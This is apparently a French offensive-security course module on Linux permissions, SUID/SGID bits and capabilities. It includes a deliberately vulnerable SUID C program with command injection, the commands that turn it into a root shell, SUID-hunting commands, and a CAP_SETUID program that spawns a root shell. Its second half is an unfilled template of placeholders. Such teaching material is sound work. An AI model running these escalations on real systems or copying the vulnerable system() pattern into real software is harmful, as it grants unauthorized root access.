# Module L07 : File Permissions Linux - SUID, SGID et Capabilities

## Objectif du Module

Maîtriser le système de permissions Linux : comprendre les permissions classiques (rwx), exploiter SUID/SGID pour privilege escalation, utiliser les capabilities Linux, détecter et créer des backdoors SUID, et auditer les systèmes pour trouver des vecteurs d'élévation de privilèges.

---

## 1. Permissions Linux de Base

### 1.1 Le modèle rwx

```
STRUCTURE DES PERMISSIONS :

-rwxr-xr-x  1  user  group  4096  Dec 7  file.txt
│││││││││││
│││││││││└─ Execute (other)
││││││││└── Write (other)
│││││││└─── Read (other)
││││││└──── Execute (group)
│││││└───── Write (group)
││││└────── Read (group)
│││└─────── Execute (owner)
││└──────── Write (owner)
│└───────── Read (owner)
└────────── Type: - (fichier), d (directory), l (symlink)

VALEURS NUMÉRIQUES :

r (read)    = 4
w (write)   = 2
x (execute) = 1

rwx = 4+2+1 = 7
r-x = 4+0+1 = 5
r-- = 4+0+0 = 4

chmod 755 file.txt  →  rwxr-xr-x
chmod 644 file.txt  →  rw-r--r--
chmod 700 file.txt  →  rwx------
```

### 1.2 Manipuler les Permissions en C

```c
#include <sys/stat.h>
#include <stdio.h>

int main(void) {
    // Changer les permissions (équivalent chmod)
    chmod("/tmp/myfile", 0755);  // rwxr-xr-x

    // Créer un fichier avec permissions spécifiques
    int fd = open("/tmp/test", O_CREAT | O_WRONLY, 0644);

    // Vérifier les permissions
    struct stat st;
    stat("/tmp/myfile", &st);

    printf("Permissions: %o\n", st.st_mode & 0777);
    printf("Owner UID: %d\n", st.st_uid);
    printf("Group GID: %d\n", st.st_gid);

    return 0;
}
```

---

## 2. SUID et SGID - Bits Spéciaux

### 2.1 Qu'est-ce que SUID ?

**SUID** (Set User ID) permet à un programme de s'exécuter avec les **privilèges du propriétaire** du fichier, pas de l'utilisateur qui le lance.

```
SANS SUID :
┌─────────────────────────────────┐
│ User: alice (UID 1000)          │
│ Execute: ./program              │
│ Process runs as: alice (1000)   │  ← Permissions limitées
└─────────────────────────────────┘

AVEC SUID (owner = root) :
┌─────────────────────────────────┐
│ User: alice (UID 1000)          │
│ Execute: ./program (SUID root)  │
│ Process runs as: root (0)       │  ← Privilèges root!
└─────────────────────────────────┘
```

**Exemple classique : /usr/bin/passwd**

```bash
$ ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 68208 passwd

# Le 's' remplace le 'x' → SUID actif
# Permet à n'importe quel user de modifier /etc/shadow (owned by root)
```

### 2.2 Créer un Binaire SUID

```c
// suid_whoami.c
#include <stdio.h>
#include <unistd.h>

int main(void) {
    printf("Real UID: %d\n", getuid());        // Qui a lancé le programme
    printf("Effective UID: %d\n", geteuid());  // Avec quels privilèges il tourne

    // Si SUID root, euid = 0 (root)
    if (geteuid() == 0) {
        printf("Running with ROOT privileges!\n");
    }

    return 0;
}
```

**Compilation et activation SUID :**

```bash
gcc -o suid_whoami suid_whoami.c

# Devenir root pour changer owner et activer SUID
sudo chown root:root suid_whoami
sudo chmod 4755 suid_whoami  # Le '4' active le bit SUID

# Vérifier
ls -l suid_whoami
# -rwsr-xr-x 1 root root ...
#    ^
#    └─ SUID actif (s au lieu de x)

# Lancer en tant qu'user normal
./suid_whoami
# Real UID: 1000 (ton user)
# Effective UID: 0 (root!)
# Running with ROOT privileges!
```

**Permissions numériques complètes :**

```
4000  →  SUID
2000  →  SGID
1000  →  Sticky bit

chmod 4755 file  →  rwsr-xr-x  (SUID + 755)
chmod 2755 file  →  rwxr-sr-x  (SGID + 755)
chmod 6755 file  →  rwsr-sr-x  (SUID + SGID + 755)
```

---

## 3. Exploiter SUID pour Privilege Escalation

### 3.1 Binaire SUID Vulnérable

```c
// vulnerable_suid.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <filename>\n", argv[0]);
        return 1;
    }

    // VULNÉRABILITÉ : system() avec input utilisateur non sanitizé
    char command[256];
    snprintf(command, sizeof(command), "cat %s", argv[1]);

    // Exécuté avec euid=0 (root) si SUID actif!
    system(command);

    return 0;
}
```

**Exploitation :**

```bash
# Compiler en tant que root et activer SUID
sudo gcc -o vuln vulnerable_suid.c
sudo chown root:root vuln
sudo chmod 4755 vuln

# EXPLOITATION : Command injection
./vuln "/etc/passwd; id"
# cat /etc/passwd
# (affiche /etc/passwd)
# uid=0(root) gid=0(root)  ← Command injectée exécutée en root!

# Obtenir un root shell
./vuln "/etc/passwd; /bin/bash"
# root@machine:~#  ← Root shell!
```

### 3.2 Trouver les Binaires SUID sur un Système

```bash
# Chercher tous les fichiers SUID
find / -perm -4000 -type f 2>/dev/null

# Chercher SUID + SGID
find / -perm -6000 -type f 2>/dev/null

# Avec détails
find / -perm -4000 -type f -ls 2>/dev/null

# Résultat type :
# /usr/bin/sudo
# /usr/bin/passwd
# /usr/bin/su
# /usr/lib/openssh/ssh-keysign
# /home/user/custom_suid  ← Suspect!
```

**En C :**

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <dirent.h>
#include <string.h>

void find_suid(const char *path) {
    DIR *dir = opendir(path);
    if (!dir) return;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        char fullpath[1024];
        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);

        struct stat st;
        if (lstat(fullpath, &st) == 0) {
            // Vérifier si SUID actif (bit 4000)
            if (S_ISREG(st.st_mode) && (st.st_mode & S_ISUID)) {
                printf("[SUID] %s (owner: %d)\n", fullpath, st.st_uid);
            }

            // Récursif pour les directories
            if (S_ISDIR(st.st_mode)) {
                find_suid(fullpath);
            }
        }
    }

    closedir(dir);
}

int main(void) {
    printf("Searching for SUID binaries...\n");
    find_suid("/");
    return 0;
}
```

---

## 4. Linux Capabilities - Alternative à SUID

### 4.1 Qu'est-ce que les Capabilities ?

Les **capabilities** permettent de donner des privilèges spécifiques sans donner full root.

```
ANCIEN MODÈLE :
┌──────────────────────────────┐
│  Unprivileged (UID != 0)     │  ← Peut rien faire de privilégié
│         VS                   │
│  Root (UID = 0)              │  ← Peut TOUT faire
└──────────────────────────────┘

NOUVEAU MODÈLE (Capabilities) :
┌──────────────────────────────┐
│  CAP_NET_RAW                 │  ← Peut créer raw sockets
│  CAP_NET_BIND_SERVICE        │  ← Peut bind ports < 1024
│  CAP_SYS_ADMIN               │  ← Mount, umount, etc.
│  CAP_DAC_OVERRIDE            │  ← Bypass file permissions
│  CAP_SETUID                  │  ← Change UID/GID
│  ... 38 capabilities total   │
└──────────────────────────────┘
```

**Capabilities principales :**

```
CAP_NET_RAW              → Raw sockets (packet sniffing)
CAP_NET_BIND_SERVICE     → Bind ports < 1024
CAP_SYS_ADMIN            → Mount, namespace, etc.
CAP_DAC_OVERRIDE         → Bypass file read/write/exec permissions
CAP_DAC_READ_SEARCH      → Bypass file read + directory execute
CAP_SETUID               → setuid(), setreuid()
CAP_SETGID               → setgid(), setregid()
CAP_SYS_PTRACE           → ptrace() any process
CAP_SYS_MODULE           → Load/unload kernel modules
```

### 4.2 Utiliser les Capabilities

```bash
# Voir les capabilities d'un binaire
getcap /usr/bin/ping
# /usr/bin/ping = cap_net_raw+ep

# Donner une capability
sudo setcap cap_net_raw+ep ./my_sniffer

# Enlever
sudo setcap -r ./my_sniffer

# Voir les capabilities du process actuel
cat /proc/self/status | grep Cap
# CapInh:   0000000000000000
# CapPrm:   0000000000000000
# CapEff:   0000000000000000
```

**Exemple : Server HTTP sur port 80 sans root**

```c
// http_server.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);  // Port 80 (privilégié)
    addr.sin_addr.s_addr = INADDR_ANY;

    // Sans capability, bind() échoue si UID != 0
    if (bind(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind (need CAP_NET_BIND_SERVICE or root)");
        return 1;
    }

    listen(sockfd, 10);
    printf("HTTP server listening on port 80 (UID: %d)\n", getuid());

    // Accept connections...

    return 0;
}
```

```bash
# Compiler
gcc -o http_server http_server.c

# Sans capability → Erreur si user normal
./http_server
# bind: Permission denied

# Donner la capability
sudo setcap cap_net_bind_service+ep ./http_server

# Maintenant ça marche sans être root!
./http_server
# HTTP server listening on port 80 (UID: 1000)
```

---

## 5. Exploitation des Capabilities

### 5.1 CAP_SETUID → Root Shell

```c
// cap_setuid_exploit.c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(void) {
    printf("Before: UID=%d, EUID=%d\n", getuid(), geteuid());

    // Si on a CAP_SETUID, on peut setuid(0) même en non-root
    if (setuid(0) == 0) {
        printf("After: UID=%d, EUID=%d\n", getuid(), geteuid());
        printf("Spawning root shell...\n");
        execl("/bin/bash", "bash", NULL);
    } else {
        perror("setuid");
    }

    return 0;
}
```

```bash
gcc -o exploit cap_setuid_exploit.c
sudo setcap cap_setuid+ep ./exploit

./exploit
# Before: UID=1000, EUID=1000
# After: UID=0, EUID=0
# root@machine:~#  ← Root shell!
```

---

## 6. Résumé

### Concepts Clés

```
PERMISSIONS SPÉCIALES :

SUID (4000)  →  Exécute avec UID du owner
SGID (2000)  →  Exécute avec GID du group
Sticky (1000) →  Seulement owner peut delete (ex: /tmp)

CAPABILITIES :

Remplacement moderne de SUID
Privilèges granulaires (38 types)
getcap / setcap
```

### Checklist

- [ ] Comprendre rwx et permissions numériques ?
- [ ] Créer et activer un binaire SUID ?
- [ ] Trouver les SUID sur un système ?
- [ ] Exploiter un SUID vulnérable ?
- [ ] Utiliser les capabilities Linux ?

---

## Objectifs pédagogiques

À la fin de ce module, vous serez capable de :
- [ ] Comprendre les concepts fondamentaux de ce sujet
- [ ] Implémenter les techniques présentées en C
- [ ] Appliquer ces connaissances dans un contexte offensif

## Prérequis

Avant de commencer ce module, assurez-vous de maîtriser :
- Les bases du langage C (variables, fonctions, pointeurs)
- [Autres prérequis spécifiques au module]

## Introduction

Permissions Linux : SUID/SGID, capabilities, exploitation

### Pourquoi ce sujet est important ?

[Explication pour débutant - analogies simples]

## Concepts fondamentaux

### Concept 1 : [Nom du concept]

[Explication détaillée avec analogies]

```
[Schéma ASCII si nécessaire]
```

### Concept 2 : [Nom du concept]

[Explication détaillée]

## Mise en pratique

### Étape 1 : [Description]

[Instructions pas à pas]

### Étape 2 : [Description]

[Instructions pas à pas]

## Application offensive

### Contexte Red Team

[Comment cette technique s'applique en Red Team]

### Considérations OPSEC

[Points de sécurité opérationnelle]

## Résumé

- Point clé 1
- Point clé 2
- Point clé 3

## Ressources complémentaires

- [Lien 1]
- [Lien 2]

---

**Navigation**
- [Module précédent](../XX_module_precedent/)
- [Module suivant](../XX_module_suivant/)
